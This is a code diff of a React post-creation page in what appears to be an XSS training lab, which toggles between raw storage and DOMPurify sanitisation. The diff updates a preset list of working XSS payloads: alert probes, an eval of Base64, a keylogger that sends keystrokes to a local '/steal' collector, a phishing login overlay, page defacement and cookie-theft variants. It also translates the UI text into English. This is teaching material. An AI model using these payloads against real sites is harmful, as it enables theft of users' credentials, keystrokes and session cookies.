@@ -2,23 +2,24 @@ import { useState } from 'react'
 import { useNavigate } from 'react-router-dom'
 import { postApi, type XSSDetection } from '../lib/api'
 import { AlertTriangle, ShieldCheck, ShieldOff, Send, Copy, Check } from 'lucide-react'
+import { useToast } from '../context/ToastContext'
 
 const PAYLOAD_PRESETS = [
-  { label: 'Basic Script', category: 'basic', payload: '<script>alert("XSS")</script>' },
   { label: 'IMG onerror', category: 'basic', payload: '<img src=x onerror="alert(\'XSS\')">' },
   { label: 'SVG onload', category: 'basic', payload: '<svg onload="alert(\'XSS\')">' },
-  { label: 'Input autofocus', category: 'basic', payload: '<input onfocus="alert(\'XSS\')" autofocus>' },
-  { label: 'Cookie Theft', category: 'attack', payload: '<img src=x onerror="fetch(\'http://localhost:4000/steal?cookie=\'+document.cookie)">' },
-  { label: 'Keylogger', category: 'attack', payload: '<script>document.onkeypress=function(e){fetch(\'http://localhost:4000/steal?type=key&key=\'+e.key)}</script>' },
-  { label: 'Phishing Overlay', category: 'attack', payload: `<script>document.body.innerHTML='<div style="position:fixed;inset:0;background:#fff;z-index:9999;display:flex;align-items:center;justify-content:center"><form action="http://localhost:4000/steal" method="POST"><h2>Session Expired</h2><input name="type" value="form" hidden><input name="username" placeholder="Username" style="display:block;margin:8px 0;padding:8px;border:1px solid #ccc"><input name="password" type="password" placeholder="Password" style="display:block;margin:8px 0;padding:8px;border:1px solid #ccc"><button style="padding:8px 16px;background:#3b82f6;color:#fff;border:none;cursor:pointer">Login</button></form></div>'</script>` },
-  { label: 'Page Defacement', category: 'attack', payload: `<script>document.body.innerHTML='<h1 style="color:red;text-align:center;margin-top:200px">HACKED</h1>'</script>` },
+  { label: 'Details ontoggle', category: 'basic', payload: '<details open ontoggle="alert(\'XSS\')">XSS</details>' },
+  { label: 'Video onerror', category: 'basic', payload: '<video src=x onerror="alert(\'XSS\')">' },
+  { label: 'Link (click me)', category: 'basic', payload: '<a href="javascript:alert(\'XSS\')">Click me</a>' },
+  { label: 'Cookie Theft', category: 'attack', payload: '<img src=x onerror="alert(\'Cookie: \'+document.cookie)">' },
+  { label: 'Keylogger', category: 'attack', payload: `<img src=x onerror="document.addEventListener('keydown',function(e){new Image().src='http://localhost:4000/steal?type=key&key='+e.key})">` },
+  { label: 'Page Defacement', category: 'attack', payload: `<img src=x onerror="document.body.innerHTML='<h1 style=color:red;text-align:center;padding-top:30vh;font-size:5em>HACKED</h1>'">` },
+  { label: 'Phishing Overlay', category: 'attack', payload: `<img src=x onerror="document.body.innerHTML='<div style=position:fixed;top:0;left:0;width:100%;height:100%;background:white;z-index:9999;display:flex;align-items:center;justify-content:center><div style=text-align:center;padding:40px;border:1px solid #ddd;border-radius:8px><h2 style=margin-bottom:16px>Session Expired - Please Login</h2><input placeholder=Username style=display:block;width:220px;padding:8px;margin:8px auto;border:1px solid #ccc;border-radius:4px><input type=password placeholder=Password style=display:block;width:220px;padding:8px;margin:8px auto;border:1px solid #ccc;border-radius:4px><button style=padding:10px 28px;background:#3b82f6;color:white;border:none;border-radius:4px;cursor:pointer>Login</button></div></div>'">` },
   { label: 'Base64 Encoded', category: 'advanced', payload: `<img src=x onerror="eval(atob('YWxlcnQoJ1hTUycp'))">` },
-  { label: 'Iframe', category: 'basic', payload: '<iframe src="javascript:alert(\'XSS\')"></iframe>' },
-  { label: 'Link', category: 'basic', payload: '<a href="javascript:alert(\'XSS\')">Click me</a>' },
 ]
 
 export default function CreatePost() {
   const navigate = useNavigate()
+  const { success, warning, error: toastError } = useToast()
   const [title, setTitle] = useState('')
   const [content, setContent] = useState('')
   const [secureMode, setSecureMode] = useState(false)
@@ -35,10 +36,16 @@ export default function CreatePost() {
 
     const res = await postApi.create(title, content, secureMode ? 'secure' : undefined)
     if (res.data) {
-      if (res.data.xssDetection) setXssInfo(res.data.xssDetection)
+      if (res.data.xssDetection?.isXSS) {
+        setXssInfo(res.data.xssDetection)
+        warning(`XSS payload detected (${res.data.xssDetection.riskLevel} risk) — post created in ${secureMode ? 'secure' : 'vulnerable'} mode`)
+      } else {
+        success('Post created successfully!')
+      }
       navigate(`/post/${res.data.id}`)
     } else {
-      setError(res.error || 'Lỗi tạo bài viết')
+      setError(res.error || 'Failed to create post')
+      toastError(res.error || 'Failed to create post')
     }
     setLoading(false)
   }
@@ -55,8 +62,8 @@ export default function CreatePost() {
 
   return (
     <div className="max-w-4xl mx-auto px-4 py-8">
-      <h1 className="text-3xl font-bold text-gray-900 mb-2">Tạo bài viết mới</h1>
-      <p className="text-gray-500 mb-8">Nhập nội dung hoặc chọn payload XSS từ thư viện bên dưới</p>
+      <h1 className="text-3xl font-bold text-gray-900 mb-2">Create New Post</h1>
+      <p className="text-gray-500 mb-8">Enter content or select an XSS payload from the library below</p>
 
       {/* Mode Toggle */}
       <div className="flex items-center gap-4 mb-6 p-4 bg-gray-50 rounded-xl border">
@@ -86,8 +93,8 @@ export default function CreatePost() {
         </button>
         <span className="text-sm text-gray-400 ml-2">
           {secureMode
-            ? 'DOMPurify sẽ sanitize nội dung trước khi lưu'
-            : 'Nội dung HTML/Script sẽ được lưu nguyên — có thể XSS!'}
+            ? 'DOMPurify will sanitize content before saving'
+            : 'HTML/Script content will be stored raw — XSS possible!'}
         </span>
       </div>
 
@@ -96,7 +103,7 @@ export default function CreatePost() {
           <div className="flex items-start gap-3">
             <AlertTriangle className="w-5 h-5 text-red-600 mt-0.5" />
             <p className="text-red-800 text-sm">
-              <strong>Cảnh báo:</strong> Chế độ Vulnerable — nội dung sẽ không được lọc. Script trong bài viết sẽ thực thi khi người dùng xem bài.
+              <strong>Warning:</strong> Vulnerable mode — content will not be filtered. Scripts in the post will execute when users view it.
             </p>
           </div>
         </div>
@@ -104,25 +111,25 @@ export default function CreatePost() {
 
       <form onSubmit={handleSubmit} className="space-y-5">
         <div>
-          <label className="block text-sm font-medium text-gray-700 mb-1">Tiêu đề</label>
+          <label className="block text-sm font-medium text-gray-700 mb-1">Title</label>
           <input
             type="text"
             value={title}
             onChange={e => setTitle(e.target.value)}
             className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
-            placeholder="Nhập tiêu đề bài viết..."
+            placeholder="Enter post title..."
             required
           />
         </div>
 
         <div>
-          <label className="block text-sm font-medium text-gray-700 mb-1">Nội dung</label>
+          <label className="block text-sm font-medium text-gray-700 mb-1">Content</label>
           <textarea
             value={content}
             onChange={e => setContent(e.target.value)}
             rows={8}
             className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 font-mono text-sm"
-            placeholder={`Nhập nội dung... hoặc thử paste payload XSS:\n<script>alert("XSS")</script>`}
+            placeholder="Enter content..."
             required
           />
         </div>
@@ -141,7 +148,7 @@ export default function CreatePost() {
           className="flex items-center gap-2 px-6 py-3 bg-blue-600 text-white rounded-lg hover:bg-blue-700 transition font-medium disabled:opacity-50"
         >
           <Send className="w-4 h-4" />
-          {loading ? 'Đang gửi...' : 'Đăng bài'}
+          {loading ? 'Submitting...' : 'Publish Post'}
         </button>
       </form>
 
